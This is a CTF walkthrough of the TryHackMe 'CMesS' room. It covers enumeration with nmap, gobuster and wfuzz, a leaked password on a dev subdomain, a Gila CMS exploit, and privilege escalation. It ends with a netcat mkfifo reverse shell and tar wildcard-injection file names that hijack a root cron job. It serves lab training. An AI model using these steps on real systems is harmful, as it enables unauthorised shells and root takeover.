<img width="457" alt="CMesS 1" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/50266cb1-99d5-4d7b-84a3-4d3d655b01bb">
<p></p>

Another room from <a href="https://tryhackme.com/"> TryHackMe</a> platform created by <a href="https://tryhackme.com/p/optional">Optional</a>.
Before we start our hacking remember to add our machine IP to /etc/hosts as <code>cmess.thm</code>

<p></p>
Tittle of this room sugests that we're gonna be dealing with CMS app, but it's good to run nmap to know what's going on...
<p></p>
<code>
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (EdDSA)
80/tcp    open     http           Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3469/tcp  filtered pluribus
3852/tcp  filtered sse-app-config
4943/tcp  filtered unknown
11140/tcp filtered unknown
25833/tcp filtered unknown
43387/tcp filtered unknown
53729/tcp filtered unknown
55321/tcp filtered unknown
58797/tcp filtered unknown
59296/tcp filtered unknown
MAC Address: 02:12:DA:40:8E:43 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms ip-10-10-255-164.eu-west-1.compute.internal (10.10.255.164)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.70 seconds
  
</code>
<p></p>
<p></p>
As usual ssh it's not our first step, so let's go to our browser and see what's there. It's a simple web page made in <a href="https://gilacms.com">Gila CMS</a>. After checking out source code it's time for futher enumeration, we'll use gobuster for this:
<p></p>
<code>gobuster dir -u YourTargetIP -w /user/share/wordlists/dirb/common.txt</code>
<p></p>
<code>
/api (Status: 200)
/assets (Status: 301)
/author (Status: 200)
/blog (Status: 200)
/category (Status: 200)
/feed (Status: 200)
/fm (Status: 200)
/index (Status: 200)
/Index (Status: 200)
/lib (Status: 301)
/log (Status: 301)
/login (Status: 200)
/robots.txt (Status: 200)
/search (Status: 200)
/Search (Status: 200)
/server-status (Status: 403)
/sites (Status: 301)
/src (Status: 301)
/tag (Status: 200)
</code>

So we've got a bunch of staff to check... first of all let's robots.txt file:
<code>
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
</code>
<p></p>
Nothing interesting... Login page seems fine, but for now we dont have any creds to use... Let's use a hint that says to check subdomains. 
<code>
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" --hw 290
</code>
<p></p>
Wfuzz foud <b>dev</b> subdomain, let see:
<p></p>
<img width="790" alt="2 dev pass" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/3d5dac9f-57d2-4fda-8628-16002367d719">
<p></p>
Now we talkin'! We've got mail and Andre's password! We can login. So what now? There're some different ways to exploit this server, for example upload reverse shell, but exploit found on exploit-db looks very promising ;) 
<p></p>
<img width="849" alt="exploit db" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/15d795f6-454b-48d3-8437-0908fb1040bb">
<p></p>
Exploit works just fine, we've got a shell, let's upgrade it to fully interactive with python. So far so good... Now it's time to use good old Linpeas:
<p></p>
<img width="680" alt="linpeas" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/57490871-eac5-4747-b18e-64bafeac8dfd">
<p></p>
Hidden file .passwordbak is what we looking for! After changing user to Andre with su command we've got <code>user.txt</code>.
<p></p>
Time to escalate our privileges. Sudo-l, searching for SUID didn't work, so maybe in cronjobs we might find something useful. <i>*Yea, I must admit that I'm a little stuck on this one.</i>
<code>*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *</code>
GTFObins will help, as always!
The wild card takes all the files located under this directory and compreses them with tar, so we can create file interpreted as a option for tar :

<code> 
$ cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc YourAttackerMachineIP Port >/tmp/f
EOF
$ echo "" > "/home/andre/backup/--checkpoint=1"
$ echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
</code>

Run Netcat and after 2 minutes we should get a shell as a root!

T.
